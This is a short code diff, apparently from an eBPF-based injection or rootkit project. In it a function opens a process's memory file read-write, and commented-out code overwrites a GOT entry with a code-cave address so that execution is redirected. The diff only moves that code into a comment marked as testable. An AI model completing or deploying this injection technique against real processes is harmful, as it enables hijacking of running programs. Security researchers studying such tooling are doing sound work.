@@ -14,7 +14,6 @@
 
 int manage_injection(const struct rb_event* event){
     char mem_file_name[100];
-    __u64 buf = (__u64)CODE_CAVE_ADDRESS_STATIC;
     int mem_fd;
 
 
@@ -26,7 +25,9 @@ int manage_injection(const struct rb_event* event){
     mem_fd = open(mem_file_name, O_RDWR);
     //lseek(mem_fd, event->got_address, SEEK_SET);
 
-    /*for(int ii=0; ii<sizeof(__u64); ii++){
+    /*You can activate this to test overwritting GOT from eBPF
+    __u64 buf = (__u64)CODE_CAVE_ADDRESS_STATIC;
+    for(int ii=0; ii<sizeof(__u64); ii++){
         if(write(mem_fd, (void*)&buf+ii, 1) < 0 ){
             perror("Error while writing at GOT");
             return -1;
